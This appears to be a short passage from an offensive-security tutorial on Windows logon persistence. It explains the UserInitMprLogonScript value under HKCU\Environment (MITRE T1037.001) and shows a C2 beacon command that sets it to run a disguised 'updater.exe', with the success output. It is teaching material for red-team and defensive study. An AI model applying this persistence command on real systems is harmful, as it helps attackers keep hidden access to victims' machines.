The `HKCU\Environment` registry key contains the user's environment variables, such as `%Path%` and `%TEMP%`.  An adversary can add another value to this key called `UserInitMprLogonScript` [[T1037.001](https://attack.mitre.org/techniques/T1037/001/)].  As with the autorun keys, is this value should contain the path to a program, then it will execute automatically when the user logs in.

```powershell
beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe

Setting registry key \\.\0000000080000001\Environment\UserInitMprLogonScript with type 2
Successfully set regkey
SUCCESS.
```
